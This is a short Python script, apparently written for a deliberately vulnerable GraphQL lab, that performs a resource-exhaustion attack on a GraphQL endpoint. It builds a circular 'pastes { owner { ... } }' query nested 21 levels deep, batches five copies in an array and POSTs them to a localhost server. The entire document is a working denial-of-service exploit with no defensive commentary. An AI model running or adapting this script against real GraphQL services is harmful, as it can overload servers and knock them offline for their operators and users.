# Array-based Query Batching with Circular Queries

import requests

ARRAY_LENGTH = 5
QUERY_REPEAT = 10 

query = {"query":"query {"}
count = 0
for _ in range(QUERY_REPEAT):
    count += 1
    closing_braces = '} ' * QUERY_REPEAT * 2  + '}'
    payload = "pastes { owner { "
    query["query"] += payload

    if count == QUERY_REPEAT:
      query["query"] += 'name' + closing_braces

print('Query:', query['query'])
print('Query Repeated:', QUERY_REPEAT, 'times')
print('Query Depth:', QUERY_REPEAT * 2 + 1, 'levels')
print('Array Length:', ARRAY_LENGTH, 'elements')



queries = []
for _ in range(ARRAY_LENGTH):
  queries.append(query)

r = requests.post('http://localhost:5013/graphql', json=queries)

print(r.json())
